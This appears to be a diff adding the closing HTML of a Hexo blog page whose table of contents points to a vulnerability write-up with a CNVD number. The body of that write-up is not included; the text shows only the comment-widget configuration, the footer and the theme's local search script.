+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-text">漏洞描述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CNVD%E7%BC%96%E5%8F%B7"><span class="toc-text">CNVD编号</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%BB%86%E8%8A%82"><span class="toc-text">漏洞细节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+
+  <div id="vcomments"></div>
+
+  <script>
+    new Valine({
+      el: '#vcomments',
+      appId: 'NDNgppjVEEzr7sUejJFVueds-gzGzoHsz',
+      appKey: 'E6rBuy0l5xXiIjq6GA24XI5J',
+      placeholder: 'Welcome!',
+      avatar: 'retro',
+      lang: 'en'
+    })
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/N0puple/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/N0puple/">Copyright © N0puple 2020</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  </body>
+</html>
